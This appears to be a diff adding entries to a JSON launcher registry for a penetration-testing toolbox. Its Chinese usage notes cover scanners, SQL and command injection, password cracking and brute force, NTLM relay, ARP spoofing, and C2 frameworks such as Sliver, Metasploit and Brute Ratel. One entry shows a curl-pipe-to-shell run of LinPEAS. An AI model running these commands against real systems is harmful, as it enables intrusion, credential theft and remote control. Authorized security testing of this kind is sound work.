+    "description": "Wireshark网络协议分析器，流量捕获和取证分析\n用法:\n  选择网络接口开始捕获\n  过滤语法: http / tcp.port==80 / ip.addr==192.168.1.1\n  CTF: 分析pcap文件，提取HTTP文件/协议字段\n  tshark命令行版: tshark -r file.pcap -Y 'http'",
+    "available": true,
+    "last_used": 1779520899
+  },
+  {
+    "id": "yakit",
+    "name": "Yakit",
+    "type": "gui",
+    "path": "/Applications/Yakit.app",
+    "category": "proxy",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "yakit",
+      "国产",
+      "burp替代"
+    ],
+    "description": "Yakit GUI版(国密/Yak语言驱动)Web安全测试平台\n用法:\n  启动后在浏览器中配置代理\n  MITM模式: 被动扫描/历史记录/漏洞检测\n  Web Fuzzer: 类Intruder功能\n  Codec: 编解码工具",
+    "available": true
+  },
+  {
+    "id": "adaptixc2-client",
+    "name": "AdaptixC2 Client",
+    "type": "gui",
+    "path": "~/Workspace/security/tools/c2/AdaptixC2/dist/AdaptixClient",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "c2",
+      "adaptix",
+      "qt6"
+    ],
+    "description": "AdaptixC2 — 现代化模块化C2框架客户端\n\n路径: ~/Workspace/security/tools/c2/AdaptixC2/dist/AdaptixClient\n\n启动方式:\n```\n~/Workspace/security/tools/c2/AdaptixC2/dist/AdaptixClient\n```\n特性:\n- 插件化架构（HTTPS/DNS Beacon, BOF支持）\n- 多人协作，队友共享session\n- 跨平台implant（Windows/Linux/macOS）\n服务端: 需单独部署AdaptixC2 server\n项目地址: https://github.com/zyylhn/AdaptixC2",
+    "available": true
+  },
+  {
+    "id": "jadx-gui-android",
+    "name": "jadx-gui (Android)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/jadx-gui",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "jadx",
+      "android",
+      "dex"
+    ],
+    "description": "Android APK/DEX反编译GUI (v1.5.5) — 实测可用\n  /opt/homebrew/bin/jadx-gui\n常用:\n  jadx-gui app.apk               拖入APK打开GUI\n  jadx-gui                        直接启动，然后File→Open\nGUI功能: 搜索字符串/类/方法、反编译到Java源码、导出Gradle项目",
+    "available": true
+  },
+  {
+    "id": "mitmproxy",
+    "name": "mitmproxy",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/mitmproxy",
+    "category": "proxy",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "mitm",
+      "http"
+    ],
+    "description": "交互式HTTP/S代理 (v12.2.2) — 实测可用\n  /opt/homebrew/bin/mitmproxy\n常用:\n  mitmproxy                        交互式TUI\n  mitmdump -w output.flow          录制流量\n  mitmweb                          Web界面 (8081端口)\n  mitmproxy -s script.py           加载插件脚本\n  mitmdump -nr flow -w filtered.flow  过滤回放\n证书安装: http://mitm.it (代理后访问)",
+    "available": true
+  },
+  {
+    "id": "sqlmap-system",
+    "name": "sqlmap (system)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/sqlmap",
+    "category": "sqli",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "sqlmap",
+      "sqli"
+    ],
+    "description": "自动化SQL注入 (v1.10.4) — 实测可用\n  /opt/homebrew/bin/sqlmap\n常用:\n  sqlmap -u 'http://target.com/?id=1' --batch --dbs\n  sqlmap -u 'http://target.com/?id=1' -D dbname --tables\n  sqlmap -r request.txt --level=5 --risk=3\n  sqlmap -u 'http://t.com/?id=1' --os-shell\n  sqlmap -u 'http://t.com/?id=1' --tamper=space2comment\n  sqlmap -u 'http://t.com/?id=1' --proxy=http://127.0.0.1:8080",
+    "available": true
+  },
+  {
+    "id": "sstimap-ssti",
+    "name": "SSTImap (SSTI)",
+    "type": "python",
+    "path": "~/Workspace/security/tools/web/SSTImap/sstimap.py",
+    "category": "ssti-cmdi",
+    "env_id": "py-brew-3-12",
+    "args": "",
+    "tags": [
+      "ssti",
+      "template"
+    ],
+    "description": "服务端模板注入(SSTI)利用 — 实测可用(需从工具目录运行)\n  ~/Workspace/security/tools/web/SSTImap/sstimap.py\n  (工具箱启动时自动 cd 到工具目录)\n常用:\n  python3 sstimap.py -u 'https://target.com/?name=test'\n  python3 sstimap.py -u 'https://t.com/page' -d 'field=test'\n  python3 sstimap.py -u 'https://t.com/?tpl=' --os-cmd 'id'\n  python3 sstimap.py -u 'https://t.com/?t=' -e jinja2,twig",
+    "available": true
+  },
+  {
+    "id": "xsstrike",
+    "name": "XSStrike",
+    "type": "shell",
+    "path": "~/.local/bin/xsstrike",
+    "category": "xss",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "xss"
+    ],
+    "description": "高级XSS检测与WAF绕过 — 实测可用\n  ~/.local/bin/xsstrike\n常用:\n  xsstrike -u 'https://target.com/search?q=test'\n  xsstrike -u 'https://t.com/' --data 'q=test'\n  xsstrike -u 'https://t.com/search?q=test' --fuzzer\n  xsstrike -u 'https://t.com/?q=' --blind",
+    "available": true
+  },
+  {
+    "id": "commix-cmd-inj",
+    "name": "commix (cmd inj)",
+    "type": "shell",
+    "path": "~/.local/bin/commix",
+    "category": "ssti-cmdi",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "commix",
+      "rce"
+    ],
+    "description": "命令注入自动化利用 — 实测可用\n  ~/.local/bin/commix\n常用:\n  commix --url='http://target.com/?param=test'\n  commix -r request.txt --data='field=test'\n  commix --url='http://t.com/page' --technique=all\n  commix --url='http://t.com/?cmd=' --os-cmd='id'",
+    "available": true
+  },
+  {
+    "id": "dalfox-xss",
+    "name": "dalfox (XSS高速)",
+    "type": "shell",
+    "path": "~/go/bin/dalfox",
+    "category": "xss",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "xss",
+      "go"
+    ],
+    "description": "高速XSS扫描利用 — 实测可用\n  ~/go/bin/dalfox\n常用:\n  dalfox url 'https://target.com/search?q=test'\n  dalfox file urls.txt --worker 50\n  cat params.txt | dalfox pipe\n  dalfox url 'https://t.com/?q=test' --blind your-xss-hunter.com\n  dalfox url 'https://t.com/search?q=' -w wordlist.txt",
+    "available": true
+  },
+  {
+    "id": "arjun",
+    "name": "arjun (隐藏参数)",
+    "type": "shell",
+    "path": "~/.local/bin/arjun",
+    "category": "recon-misc",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "param"
+    ],
+    "description": "HTTP隐藏参数发现 — 实测可用\n  ~/.local/bin/arjun\n常用:\n  arjun -u https://target.com/endpoint\n  arjun -u https://target.com -m POST\n  arjun -i urls.txt -o params.json\n  arjun -u https://target.com -c 250  设置并发数",
+    "available": true,
+    "last_used": 1779449573
+  },
+  {
+    "id": "wpprobe-wp",
+    "name": "wpprobe (WP指纹)",
+    "type": "shell",
+    "path": "~/.local/bin/wpprobe",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "wordpress"
+    ],
+    "description": "WordPress指纹识别 — 实测可用\n  ~/.local/bin/wpprobe\n常用:\n  wpprobe -u https://target.com\n  wpprobe -u https://target.com -a  枚举用户\n  wpprobe -u https://target.com --plugins",
+    "available": true
+  },
+  {
+    "id": "nikto",
+    "name": "nikto",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/nikto",
+    "category": "vuln-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "nikto"
+    ],
+    "description": "Web服务器漏洞扫描 (v2.6.0) — 实测可用\n  /opt/homebrew/bin/nikto\n常用:\n  nikto -h https://target.com\n  nikto -h target.com -p 8080,8443\n  nikto -h target.com -Tuning 4   仅XSS测试\n  nikto -h target.com -ssl\n  nikto -h target.com -o report.html -Format html",
+    "available": true
+  },
+  {
+    "id": "wafw00f-waf",
+    "name": "wafw00f (WAF识别)",
+    "type": "shell",
+    "path": "~/.local/bin/wafw00f",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "waf"
+    ],
+    "description": "WAF识别工具 — 实测可用\n  ~/.local/bin/wafw00f\n常用:\n  wafw00f https://target.com\n  wafw00f -a https://target.com    枚举所有WAF\n  wafw00f -i targets.txt\n  wafw00f https://target.com -f json",
+    "available": true
+  },
+  {
+    "id": "nuclei",
+    "name": "nuclei (扫描)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/nuclei",
+    "category": "vuln-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "nuclei",
+      "templates"
+    ],
+    "description": "模板化漏洞扫描 (v3.8.0) — 实测可用\n  /opt/homebrew/bin/nuclei\n常用:\n  nuclei -u https://target.com -t cves/ -severity critical,high\n  nuclei -l urls.txt -t exposures/ -o result.txt\n  nuclei -u target.com -tags rce,sqli -as\n  nuclei -u target.com -t network/ -ept http\n  nuclei -u target.com -t cves/2024/ -severity critical",
+    "available": true
+  },
+  {
+    "id": "ffuf-fuzz",
+    "name": "ffuf (fuzz)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/ffuf",
+    "category": "dir-fuzz",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fuzz"
+    ],
+    "description": "高速Web模糊测试 (v2.1.0) — 实测可用\n  /opt/homebrew/bin/ffuf\n常用:\n  ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404\n  ffuf -u https://target.com/FUZZ -w list.txt -e .php,.bak,.zip\n  ffuf -u https://target.com/?FUZZ=test -w params.txt\n  ffuf -u https://t.com/FUZZ -w list.txt -mc 200,301,302\n  ffuf -u https://t.com/ -H 'Host: FUZZ.target.com' -w vhosts.txt",
+    "available": true
+  },
+  {
+    "id": "gobuster",
+    "name": "gobuster",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/gobuster",
+    "category": "dir-fuzz",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "bruteforce",
+      "dir"
+    ],
+    "description": "目录/DNS爆破 — 实测可用\n  /opt/homebrew/bin/gobuster\n常用:\n  gobuster dir -u https://target.com -w wordlist.txt -x php,html\n  gobuster dns -d target.com -w subdomains.txt\n  gobuster vhost -u https://target.com -w vhosts.txt\n  gobuster dir -u https://t.com -w list.txt -t 50 --no-error",
+    "available": true
+  },
+  {
+    "id": "nmap",
+    "name": "nmap",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/nmap",
+    "category": "port-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "nmap",
+      "scan"
+    ],
+    "description": "端口扫描 / 服务识别 (v7.99) — 实测可用\n  /opt/homebrew/bin/nmap\n常用:\n  nmap -sV -sC <target>              服务版本+默认脚本\n  nmap -p- --min-rate 5000 <target>  全端口快速扫描\n  nmap -sU --top-ports 200 <target>  UDP Top200\n  nmap -A -O <target>                OS识别+路由追踪\n  nmap --script vuln <target>        漏洞脚本\n  nmap -sn 192.168.1.0/24           存活探测(无端口)",
+    "available": true
+  },
+  {
+    "id": "masscan",
+    "name": "masscan",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/masscan",
+    "category": "port-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "masscan"
+    ],
+    "description": "高速全网端口扫描 (v1.3.2) — 实测可用\n  /opt/homebrew/bin/masscan\n常用:\n  masscan <IP/CIDR> -p1-65535 --rate=10000\n  masscan -iL targets.txt -p80,443,8080 --rate=5000\n  masscan 10.0.0.0/8 -p22,80,443 --rate=100000\n  masscan <target> -p0-65535 --rate=50000 -oX out.xml\n注: rate 建议局域网 ≤50000，外网 ≤5000",
+    "available": true
+  },
+  {
+    "id": "rustscan",
+    "name": "rustscan",
+    "type": "shell",
+    "path": "~/.cargo/bin/rustscan",
+    "category": "port-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "rustscan"
+    ],
+    "description": "超快速端口扫描 (v2.4.1) — 实测可用\n  ~/.cargo/bin/rustscan\n常用:\n  rustscan -a <target> -- -sV -sC\n  rustscan -a <target> -p 1-65535 -- -A\n  rustscan -a 192.168.1.0/24 --ulimit 5000\n  rustscan -a <target> --range 1-1000 -- -sV",
+    "available": true
+  },
+  {
+    "id": "naabu",
+    "name": "naabu (端口)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/naabu",
+    "category": "port-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "port"
+    ],
+    "description": "快速端口扫描 — 实测可用\n  /opt/homebrew/bin/naabu\n常用:\n  naabu -host <target> -top-ports 1000\n  naabu -list targets.txt -p 80,443,8080,8443\n  naabu -host <target> -p- -rate 10000\n  naabu -host <target> -p 1-65535 -o ports.txt",
+    "available": true
+  },
+  {
+    "id": "subfinder",
+    "name": "subfinder (子域名)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/subfinder",
+    "category": "subdomain",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "subdomain"
+    ],
+    "description": "被动子域名枚举 (v2.13.0) — 实测可用\n  /opt/homebrew/bin/subfinder\n常用:\n  subfinder -d target.com -all -o subs.txt\n  subfinder -d target.com -recursive\n  subfinder -dL domains.txt -o subs.txt\n  subfinder -d target.com -all -silent | httpx -silent",
+    "available": true
+  },
+  {
+    "id": "amass",
+    "name": "amass (资产)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/amass",
+    "category": "subdomain",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "asset",
+      "subdomain"
+    ],
+    "description": "综合资产发现 (v5.1.1) — 实测可用\n  /opt/homebrew/bin/amass\n常用:\n  amass enum -passive -d target.com\n  amass enum -active -d target.com -brute\n  amass intel -whois -d target.com\n  amass enum -d target.com -o out.txt",
+    "available": true
+  },
+  {
+    "id": "httpx-web",
+    "name": "httpx (Web存活)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/httpx",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "http",
+      "fingerprint"
+    ],
+    "description": "HTTP探测与指纹识别 — 实测可用\n  /opt/homebrew/bin/httpx\n常用:\n  cat urls.txt | httpx -status-code -title -tech-detect\n  echo target.com | httpx -probe -silent\n  httpx -l hosts.txt -o alive.txt -sc -ct -title\n  httpx -l hosts.txt -screenshot -srd screens/\n  subfinder -d t.com -silent | httpx -sc -title -tech",
+    "available": true
+  },
+  {
+    "id": "katana",
+    "name": "katana (爬虫)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/katana",
+    "category": "recon-misc",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "crawler"
+    ],
+    "description": "现代化Web爬虫 — 实测可用\n  /opt/homebrew/bin/katana\n常用:\n  katana -u https://target.com -d 3 -o urls.txt\n  katana -u https://target.com -jc -kf all\n  katana -list urls.txt -f qurl -o params.txt\n  katana -u https://target.com -d 5 -ps -pss waybackarchive",
+    "available": true
+  },
+  {
+    "id": "gitleaks-secret",
+    "name": "gitleaks (secret)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/gitleaks",
+    "category": "code-audit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "git",
+      "secret"
+    ],
+    "description": "Git仓库敏感信息扫描 (v8.30.1) — 实测可用\n  /opt/homebrew/bin/gitleaks\n常用:\n  gitleaks detect --source . -v\n  gitleaks detect --source /repo --report-path leak.json\n  gitleaks detect --log-opts 'HEAD~10..HEAD'\n  gitleaks git -r https://github.com/org/repo",
+    "available": true
+  },
+  {
+    "id": "hashcat-gpu",
+    "name": "hashcat (GPU)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/hashcat",
+    "category": "password",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "hash",
+      "gpu"
+    ],
+    "description": "GPU加速哈希破解 (v7.1.2) — 实测可用\n  /opt/homebrew/bin/hashcat\n常用:\n  hashcat -m 1000 ntlm.txt rockyou.txt       NTLM\n  hashcat -m 18200 asrep.txt rockyou.txt     AS-REP Roast\n  hashcat -m 13100 krb5tgs.txt rockyou.txt   Kerberoast\n  hashcat -m 22000 wpa.hccapx rockyou.txt    WPA2\n  hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule\n  hashcat --show -m 1000 hash.txt   查看已破解",
+    "available": true
+  },
+  {
+    "id": "john-the-ripper",
+    "name": "John the Ripper",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/john",
+    "category": "password",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "hash"
+    ],
+    "description": "John the Ripper密码破解 — 实测可用\n  /opt/homebrew/bin/john\n常用:\n  john --wordlist=rockyou.txt hash.txt\n  john --format=NT hash.txt --wordlist=list.txt\n  ssh2john id_rsa > id_rsa.hash && john id_rsa.hash\n  zip2john secret.zip > zip.hash && john zip.hash\n  john --show hash.txt   查看已破解\n  john --list=formats    查看支持格式",
+    "available": true
+  },
+  {
+    "id": "hydra",
+    "name": "hydra (在线爆破)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/hydra",
+    "category": "password",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "online",
+      "ssh"
+    ],
+    "description": "在线密码爆破 (v9.6) — 实测可用\n  /opt/homebrew/bin/hydra\n常用:\n  hydra -l admin -P rockyou.txt ssh://target\n  hydra -L users.txt -P pass.txt ftp://target\n  hydra -l admin -P pass.txt target http-post-form '/login:u=^USER^&p=^PASS^:F=error'\n  hydra -l admin -P pass.txt target smb\n  hydra -l user -P pass.txt rdp://target\n  hydra -C credentials.txt ssh://target  用户名:密码格式",
+    "available": true
+  },
+  {
+    "id": "hashid",
+    "name": "hashid (类型识别)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/hashid",
+    "category": "crypto",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "hash"
+    ],
+    "description": "哈希类型识别 (v3.1.4) — 实测可用\n  /opt/homebrew/bin/hashid\n常用:\n  hashid 'aad3b435b51404eeaad3b435b51404ee'\n  hashid -m '<hash>'     返回hashcat模式编号\n  hashid -j '<hash>'     返回john格式\n  hashid '$2y$10$...'    识别bcrypt",
+    "available": true
+  },
+  {
+    "id": "radare2-cli",
+    "name": "radare2 (CLI)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/radare2",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "radare2"
+    ],
+    "description": "逆向工程框架 (v6.1.4) — 实测可用\n  /opt/homebrew/bin/radare2\n常用:\n  r2 binary             静态分析\n  r2 -d ./binary        调试模式\n  # r2内部:\n  aaa                   自动分析\n  afl                   列出函数\n  pdf @ main            反汇编main\n  VV                    视觉模式\n  iz                    列出字符串",
+    "available": true
+  },
+  {
+    "id": "binwalk",
+    "name": "binwalk (固件)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/binwalk",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "firmware"
+    ],
+    "description": "固件分析与提取 (v3.1.0) — 实测可用\n  /opt/homebrew/bin/binwalk\n常用:\n  binwalk firmware.bin           文件类型分析\n  binwalk -e firmware.bin        提取文件系统\n  binwalk -Me firmware.bin       递归提取\n  binwalk -A binary              扫描CPU架构指令\n  binwalk -E firmware.bin        熵分析(检测加密)",
+    "available": true
+  },
+  {
+    "id": "apktool-apk",
+    "name": "apktool (APK)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/apktool",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "android",
+      "apk"
+    ],
+    "description": "APK逆向工程工具 (v3.0.2) — 实测可用\n  /opt/homebrew/bin/apktool\n常用:\n  apktool d app.apk              反编译(smali+资源)\n  apktool b app/ -o rebuilt.apk  重新打包\n  apktool d app.apk --no-debug-info\n  apktool d app.apk -f           强制覆盖\n重打包后签名: jarsigner -keystore debug.keystore rebuilt.apk androiddebugkey",
+    "available": true
+  },
+  {
+    "id": "capa",
+    "name": "capa (能力分析)",
+    "type": "shell",
+    "path": "~/.local/bin/capa",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "malware"
+    ],
+    "description": "二进制能力分析 (v9.4.0) — 实测可用(首次运行慢)\n  ~/.local/bin/capa\n常用:\n  capa malware.exe                   分析能力\n  capa -j output.json malware.exe    JSON输出\n  capa -v malware.exe                详细模式\n  capa --signatures /path/ sample    指定签名库\n  capa -f pe malware.exe             指定格式",
+    "available": true
+  },
+  {
+    "id": "checksec-elf",
+    "name": "checksec (ELF)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/checksec",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "elf",
+      "pwn"
+    ],
+    "description": "ELF安全保护检测 — 实测可用\n  /opt/homebrew/bin/checksec\n常用:\n  checksec --file=./binary\n  checksec --proc-all            检查所有运行进程\n  checksec --file=./binary --output json\n输出包括: RELRO, Stack Canary, NX, PIE, ASLR, RUNPATH",
+    "available": true
+  },
+  {
+    "id": "brute-ratel-commander-mac",
+    "name": "Brute Ratel Commander (Mac)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/c2/bruteratel/commander-mac.sh",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "c2",
+      "brc4"
+    ],
+    "description": "Brute Ratel C4 商业C2框架(BRC4)控制端\n用法: 启动后配置Listener和Profile，生成Beacon\n功能: EDR免杀、进程注入、横向移动\n注意: 仅限授权红队演练，需配合服务端使用",
+    "available": true
+  },
+  {
+    "id": "vshell-c2",
+    "name": "vshell C2 启动",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/vshell-up.sh",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "c2",
+      "vshell",
+      "docker"
+    ],
+    "description": "vshell C2 框架 - 用 Docker 在本机启动服务端\n  启动脚本: ~/Workspace/security/tools/TH_Tools/tools/_launchers/vshell-up.sh\n  服务端目录: ~/Workspace/security/tools/c2/vshell_4.9.3/\n  (仅 Linux/Windows 二进制，通过 docker compose 在本机跑)\n使用步骤:\n  1. 点击启动 → 自动执行 docker compose up -d\n  2. 浏览器访问 http://127.0.0.1:8082 (admin/CHANGE_ME)\n  3. 监听端口: 8443 (HTTPS) / 8888 (HTTP)\n  4. 生成 agent: 在 Web UI 中配置并下载 payload\n手动命令:\n  cd ~/Workspace/security/tools/c2/vshell_4.9.3 && docker compose up -d\n  docker compose logs -f   查看日志\n前提: Docker Desktop 已运行",
+    "available": true
+  },
+  {
+    "id": "sliver-c2-cli",
+    "name": "Sliver C2 (CLI)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/sliver",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "c2",
+      "sliver"
+    ],
+    "description": "Sliver开源C2框架(Go实现)，支持多种通信协议\n用法:\n  sliver-server    (启动服务端控制台)\n  sliver           (连接本机服务端)\n  # 在sliver控制台中:\n  generate --mtls 192.168.1.1 --os windows --arch 64  (生成implant)\n  mtls --lport 443                                     (启动MTLS监听)\n  sessions                                             (查看会话)\n注意: brew formula暂不可用，需手动下载二进制: https://github.com/BishopFox/sliver/releases",
+    "available": true
+  },
+  {
+    "id": "metasploit-msfconsole",
+    "name": "Metasploit (msfconsole)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/msfconsole",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "msf"
+    ],
+    "description": "Metasploit Framework渗透测试框架\n用法:\n  msfconsole                          (进入交互终端)\n  msfvenom -p ... -f exe -o shell.exe (生成Payload)\n  # 常用命令:\n  use exploit/multi/handler           (设置监听)\n  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n  set LHOST <IP>; set LPORT 4444; run\n  search cve:2021                     (搜索CVE模块)",
+    "available": true
+  },
+  {
+    "id": "finder",
+    "name": "提权工具箱 (Finder)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/privesc-finder.sh",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "privesc",
+      "linpeas"
+    ],
+    "description": "HackerPermKeeper - 综合提权辅助工具\n  脚本路径: ~/Workspace/security/tools/TH_Tools/tools/post-ex/tiquan/main.py\n  Python 环境: TH_Tools 内置 Python 3.12\n功能:\n  - Linux/Windows 提权向量检测\n  - 漏洞 CVE 提权 PoC 集成\n  - 权限维持模块\n使用:\n  python3 main.py --help\n  python3 main.py -t linux    Linux 提权检测\n  python3 main.py -t windows  Windows 提权检测",
+    "available": true
+  },
+  {
+    "id": "linpeas",
+    "name": "LinPEAS 速查",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/linpeas-show.sh",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "privesc",
+      "linux"
+    ],
+    "description": "LinPEAS Linux提权信息收集脚本(快速查阅版)\n用法:\n  # 在目标机器上执行:\n  ./linpeas.sh                  (完整扫描)\n  ./linpeas.sh -a               (全部检查)\n  curl -L https://... | sh      (在线执行，断网环境用本地)\n  # 工具箱中查看linpeas.sh脚本路径并上传到目标机器\n  功能: SUID/sudo/定时任务/PATH劫持/内核版本/密码文件检查",
+    "available": true
+  },
+  {
+    "id": "netexec-nxc",
+    "name": "netexec (nxc)",
+    "type": "shell",
+    "path": "~/.local/bin/netexec",
+    "category": "lateral",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "smb",
+      "ad"
+    ],
+    "description": "网络认证利用框架 — 实测可用\n  ~/.local/bin/netexec\n常用:\n  nxc smb 192.168.1.0/24              SMB存活探测\n  nxc smb <target> -u admin -p pass   凭证验证\n  nxc smb <target> -u user -p pass --shares\n  nxc winrm <target> -u user -p pass -x 'whoami'\n  nxc ldap <target> -u user -p pass --bloodhound\n  nxc smb <target> -u user -H <ntlm_hash>  PTH",
+    "available": true
+  },
+  {
+    "id": "certipy-ad-adcs",
+    "name": "certipy-ad (ADCS)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/certipy",
+    "category": "domain-atk",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "adcs",
+      "ad"
+    ],
+    "description": "ADCS证书攻击 (v5.0.4) — 实测可用\n  /opt/homebrew/bin/certipy\n常用:\n  certipy find -u user@corp.local -p pass -dc-ip <dc>  枚举证书模板\n  certipy req -u user@corp -p pass -ca CA -template Template\n  certipy auth -pfx user.pfx  用证书认证获取NTLM\n  certipy shadow auto -u user@corp -p pass -account target\n  certipy find -u user@corp -p pass -vulnerable  仅显示脆弱模板",
+    "available": true
+  },
+  {
+    "id": "bloodyad-dacl",
+    "name": "bloodyAD (DACL)",
+    "type": "shell",
+    "path": "~/.local/bin/bloodyad",
+    "category": "domain-enum",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ad",
+      "dacl"
+    ],
+    "description": "AD DACL/ACL权限滥用 — 实测可用\n  ~/.local/bin/bloodyad\n常用:\n  bloodyAD --host <dc> -d corp.local -u user -p pass get object 'Domain Admins'\n  bloodyAD --host <dc> -d corp.local -u owner -p pass add genericAll targetUser\n  bloodyAD --host <dc> -d corp.local -u user -p pass set password target 'NewPass!'\n  bloodyAD --host <dc> -d corp.local -u user -p pass get writable",
+    "available": true
+  },
+  {
+    "id": "responder",
+    "name": "Responder (毒化)",
+    "type": "shell",
+    "path": "~/.local/bin/responder",
+    "category": "domain-cred",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "llmnr",
+      "ad"
+    ],
+    "description": "LLMNR/NBT-NS毒化 + NTLMv2捕获 — 实测可用\n  ~/.local/bin/responder\n常用:\n  sudo responder -I eth0              主动毒化\n  sudo responder -I eth0 -A           分析模式(不毒化)\n  sudo responder -I eth0 -w -d        +WPAD+DHCP\n  sudo responder -I eth0 -f           强制基础认证\nHash保存位置: /opt/homebrew/share/responder/logs/",
+    "available": true
+  },
+  {
+    "id": "mitm6-ipv6",
+    "name": "mitm6 (IPv6)",
+    "type": "shell",
+    "path": "~/.local/bin/mitm6",
+    "category": "domain-cred",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ipv6",
+      "mitm"
+    ],
+    "description": "IPv6 DNS欺骗 + NTLM中继 — 实测可用\n  ~/.local/bin/mitm6\n常用:\n  sudo mitm6 -d corp.local -i eth0\n  # 配合ntlmrelayx:\n  impacket-ntlmrelayx -6 -wh attacker-wh -t smb://dc/\n  impacket-ntlmrelayx -6 -wh attacker-wh -t ldaps://dc --delegate-access\n注: 需要 sudo 权限，在目标域网络内使用",
+    "available": true
+  },
+  {
+    "id": "bettercap",
+    "name": "bettercap",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/bettercap",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "mitm",
+      "wifi"
+    ],
+    "description": "网络中间人攻击框架 (v2.41.5) — 实测可用\n  /opt/homebrew/bin/bettercap\n常用:\n  sudo bettercap -iface eth0\n  # bettercap内:\n  net.probe on; net.show           发现局域网主机\n  arp.spoof on                     ARP欺骗\n  net.sniff on                     流量嗅探\n  https.proxy on                   HTTPS代理",
+    "available": true
+  },
+  {
+    "id": "yara",
+    "name": "YARA (恶意签名)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/yara",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "forensics",
+      "malware"
+    ],
+    "description": "恶意软件特征匹配 (v4.5.5) — 实测可用\n  /opt/homebrew/bin/yara\n常用:\n  yara rules.yar suspicious_file\n  yara -r rules.yar /path/to/dir    递归扫描\n  yara -s rules.yar file            显示匹配字符串\n  yara malware_rules/ /mnt/sample/\n  yara -p 8 rules.yar /dir         8线程并行",
+    "available": true
+  },
+  {
+    "id": "exiftool",
+    "name": "exiftool",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/exiftool",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "metadata"
+    ],
